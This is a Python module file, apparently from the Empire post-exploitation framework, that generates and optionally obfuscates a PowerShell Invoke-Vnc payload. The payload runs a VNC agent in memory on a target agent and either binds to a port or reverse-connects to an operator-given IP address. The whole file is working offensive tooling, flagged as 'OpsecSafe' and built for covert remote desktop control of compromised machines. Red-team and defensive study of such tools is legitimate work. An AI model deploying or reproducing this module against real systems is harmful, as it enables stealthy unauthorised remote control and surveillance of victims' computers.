from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Vnc',

            'Author': ['@n00py'],

            'Description': ('Invoke-Vnc executes a VNC agent in-memory and initiates a reverse connection, or binds to a specified port. Password authentication is supported.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/artkond/Invoke-Vnc'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Port' : {
                'Description'     :   'Port to Use.',
                'Required'        :   True,
                'Value'           :   '5900'
            },
            'Password' : {
                'Description'     :   'Password to use.',
                'Required'        :   True,
                'Value'           :   'password'
            },
            'ConType' : {
                'Description'     :   'Connection type, choose \"bind\" or \"reverse\".',
                'Required'        :   True,
                'Value'           :   'bind'
            }
            ,
            'IpAddress' : {
                'Description'     :   'IP Address to use for reverse connection.',
                'Required'        :   False,
                'Value'           :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleName = self.info["Name"]

        # read in th Invoke-Vnc.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-Vnc.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "\nInvoke-Vnc"

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
